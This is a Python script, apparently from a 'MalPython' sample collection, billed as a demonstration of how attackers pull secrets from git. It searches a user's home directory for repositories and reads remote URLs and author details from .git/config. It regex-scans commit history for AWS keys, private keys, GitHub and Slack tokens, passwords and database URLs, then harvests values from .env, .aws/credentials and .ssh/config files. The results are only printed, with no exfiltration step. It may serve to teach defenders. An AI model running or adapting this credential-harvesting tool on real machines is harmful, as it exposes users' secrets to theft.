# MalPython
#
# Git Configuration and Repository Scanning
# Demonstrate how attackers etract sensitive information from git
# 1. enumerate git repository on the system
# 2. extract authentication tokens and credentials from .git/config
# 3. scan git history for secrets (API keys, passwords, tokens)
# 4. retrieve repository URLs and clone URLs
# 5. rind valuable source code and configurations
# 6. identify potential targets for further attacks
#
# This sample only print the result

import os
import re
import subprocess
import glob
from typing import Dict, List, Optional
from pathlib import Path


# Patterns for common secrets in git history
SECRET_PATTERNS = {
    "AWS_KEY": r"AKIA[0-9A-Z]{16}",
    "PRIVATE_KEY": r"-----BEGIN (RSA|EC|OPENSSH|PGP) PRIVATE KEY",
    "PASSWORD": r"password\s*[:=]\s*['\"]?([^'\";\n]+)",
    "API_KEY": r"api[_-]?key\s*[:=]\s*['\"]?([^'\";\n]+)",
    "GITHUB_TOKEN": r"ghp_[A-Za-z0-9_]{36}",
    "GENERIC_TOKEN": r"token\s*[:=]\s*['\"]?([^'\";\n]+)",
    "DATABASE_URL": r"(postgres|mysql|mongodb)://[^/]+:[^@]+@[^\s]+",
    "AWS_SECRET": r"aws_secret_access_key\s*[:=]\s*['\"]?([^'\";\n]+)",
    "SLACK_TOKEN": r"xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[A-Za-z0-9_-]{24,34}",
    "GITHUB_URL": r"github\.com/[^/]+/[^/\s\"]+",
}


def find_git_repos(search_path: str = os.path.expanduser("~")) -> List[str]:
    """Find all git repositories on the system."""
    repos = []

    print(f"[*] Searching for git repositories in {search_path}")
    print()

    # Search for .git directories (limit depth to avoid slow searches)
    try:
        for root, dirs, files in os.walk(search_path, topdown=True):
            # Limit search depth
            if root.count(os.sep) - search_path.count(os.sep) > 5:
                dirs[:] = []
                continue

            # Skip common directories
            dirs[:] = [
                d
                for d in dirs
                if d
                not in [
                    ".cache",
                    ".npm",
                    "node_modules",
                    ".venv",
                    "venv",
                    ".env",
                    "__pycache__",
                ]
            ]

            if ".git" in dirs:
                repos.append(root)
                print(f"    ✓ Found: {root}")

    except PermissionError:
        pass

    return repos


def scan_git_config(repo_path: str) -> Dict:
    """Extract credentials and configuration from .git/config."""
    config = {}

    config_file = os.path.join(repo_path, ".git", "config")

    if not os.path.exists(config_file):
        return config

    try:
        with open(config_file, "r") as f:
            content = f.read()

            # Extract remote URLs
            remote_pattern = r'\[remote "([^"]+)"\]\s+url\s*=\s*(.+)'
            remotes = re.findall(remote_pattern, content)

            if remotes:
                config["remotes"] = {}
                for name, url in remotes:
                    config["remotes"][name] = url
                    print(f"    ✓ Remote '{name}': {url}")

            # Extract branch tracking info
            branch_pattern = r'\[branch "([^"]+)"\]\s+remote\s*=\s*(.+)'
            branches = re.findall(branch_pattern, content)

            if branches:
                config["branches"] = dict(branches)

            # Extract user configuration
            user_pattern = r"\[user\]\s+name\s*=\s*(.+)\s+email\s*=\s*(.+)"
            user_match = re.search(user_pattern, content)

            if user_match:
                config["user_name"] = user_match.group(1)
                config["user_email"] = user_match.group(2)
                print(f"    ✓ Author: {user_match.group(1)} <{user_match.group(2)}>")

    except Exception as e:
        print(f"    [!] Error reading config: {e}")

    return config


def scan_git_history(repo_path: str, max_commits: int = 100) -> Dict:
    """Scan git history for secrets and sensitive information."""
    secrets = {
        "found_secrets": [],
        "urls_found": [],
        "commits_checked": 0,
    }

    print()
    print(f"[*] Scanning git history for secrets (last {max_commits} commits)...")

    try:
        os.chdir(repo_path)

        # Get recent commits
        result = subprocess.run(
            ["git", "log", f"-{max_commits}", "--format=%H", "--all"],
            capture_output=True,
            text=True,
            timeout=10,
        )

        commits = result.stdout.strip().split("\n")
        secrets["commits_checked"] = len(commits)

        for i, commit in enumerate(commits):
            if not commit:
                continue

            try:
                # Get commit diff
                diff_result = subprocess.run(
                    ["git", "show", commit, "--format="],
                    capture_output=True,
                    text=True,
                    timeout=5,
                )

                diff_content = diff_result.stdout

                # Scan for secrets
                for secret_type, pattern in SECRET_PATTERNS.items():
                    matches = re.finditer(pattern, diff_content, re.IGNORECASE)

                    for match in matches:
                        secret = {
                            "type": secret_type,
                            "commit": commit[:7],
                            "value": match.group(0),
                        }
                        secrets["found_secrets"].append(secret)

                        if secret_type in ["GITHUB_URL", "DATABASE_URL"]:
                            print(f"    ! {secret_type}: {match.group(0)[:60]}")

            except subprocess.TimeoutExpired:
                pass
            except Exception:
                pass

    except Exception as e:
        print(f"    [!] Error scanning history: {e}")

    return secrets


def find_env_files(repo_path: str) -> List[str]:
    """Find .env and configuration files in repository."""
    env_files = []

    print()
    print("[*] Searching for .env and config files...")

    patterns = [
        ".env",
        ".env.local",
        ".env.*.local",
        "config.json",
        "config.yaml",
        "config.yml",
        "secrets.json",
        ".aws/credentials",
        ".ssh/config",
    ]

    for pattern in patterns:
        matches = glob.glob(os.path.join(repo_path, f"**/{pattern}"), recursive=True)
        for match in matches:
            if ".git" not in match:  # Skip git internal files
                env_files.append(match)
                print(f"    ✓ {match}")

    return env_files


def scan_env_files(files: List[str]) -> Dict:
    """Extract secrets from .env and config files."""
    secrets = {}

    print()
    print("[*] Extracting secrets from configuration files...")

    for filepath in files:
        try:
            with open(filepath, "r") as f:
                content = f.read()

                # Find key=value pairs
                key_value_pattern = r"([A-Z_]+(?:_KEY|_SECRET|_TOKEN|_PASSWORD|_URL))\s*=\s*(.+)"
                matches = re.finditer(key_value_pattern, content, re.IGNORECASE)

                for match in matches:
                    key, value = match.groups()
                    secrets[key] = value.strip()
                    print(f"    ! {key}: {value.strip()[:40]}")

        except Exception as e:
            print(f"    [!] Error reading {filepath}: {e}")

    return secrets


def analyze_repository_structure(repo_path: str) -> Dict:
    """Analyze repository structure for clues about what it contains."""
    analysis = {
        "type": "unknown",
        "frameworks": [],
        "languages": [],
        "services": [],
        "potential_secrets": [],
    }

    print()
    print("[*] Analyzing repository structure...")

    # Check for framework indicators
    framework_indicators = {
        "Django": ["manage.py", "wsgi.py"],
        "Flask": ["app.py", "wsgi.py"],
        "Node.js": ["package.json", "server.js"],
        "Rails": ["Gemfile", "config/database.yml"],
        "Spring": ["pom.xml", "application.properties"],
        ".NET": ["*.csproj", "web.config"],
        "Go": ["go.mod", "go.sum"],
        "Rust": ["Cargo.toml"],
    }

    for framework, files in framework_indicators.items():
        for pattern in files:
            if glob.glob(os.path.join(repo_path, pattern)):
                analysis["frameworks"].append(framework)
                print(f"    ✓ Framework: {framework}")
                break

    # Check for service configurations
    service_indicators = {
        "Docker": ["Dockerfile", "docker-compose.yml"],
        "Kubernetes": ["k8s/", "*.yaml"],
        "Database": ["migrations/", "schema.sql"],
        "Cloud": ["*.tf", "cloudformation.yml", "sam.yaml"],
    }

    for service, patterns in service_indicators.items():
        for pattern in patterns:
            if glob.glob(os.path.join(repo_path, pattern)):
                analysis["services"].append(service)
                print(f"    ✓ Service: {service}")
                break

    return analysis


def main():
    """Run git reconnaissance."""

    print("[*] Git Configuration & Repository Scanning")
    print()

    # Find repositories
    repos = find_git_repos()

    if not repos:
        print("[!] No git repositories found")
        return

    print()
    print(f"[*] Found {len(repos)} repository/repositories")
    print()

    # Scan each repository
    for repo_path in repos[:5]:  # Limit to first 5 to avoid spam
        print(f"[*] Scanning: {repo_path}")
        print()

        # Extract git config
        config = scan_git_config(repo_path)

        # Scan git history for secrets
        secrets = scan_git_history(repo_path, max_commits=50)

        # Find env files
        env_files = find_env_files(repo_path)

        # Scan env files
        if env_files:
            env_secrets = scan_env_files(env_files)

        # Analyze structure
        analysis = analyze_repository_structure(repo_path)

        print()
        print("[*] Summary for this repository:")
        print(f"  - Frameworks: {', '.join(analysis['frameworks']) or 'None detected'}")
        print(f"  - Services: {', '.join(analysis['services']) or 'None detected'}")
        if config.get("remotes"):
            print(f"  - Remotes: {', '.join(config['remotes'].keys())}")
        print(f"  - Commits scanned: {secrets['commits_checked']}")
        print(f"  - Secrets found in history: {len(secrets['found_secrets'])}")
        print()


if __name__ == "__main__":
    main()
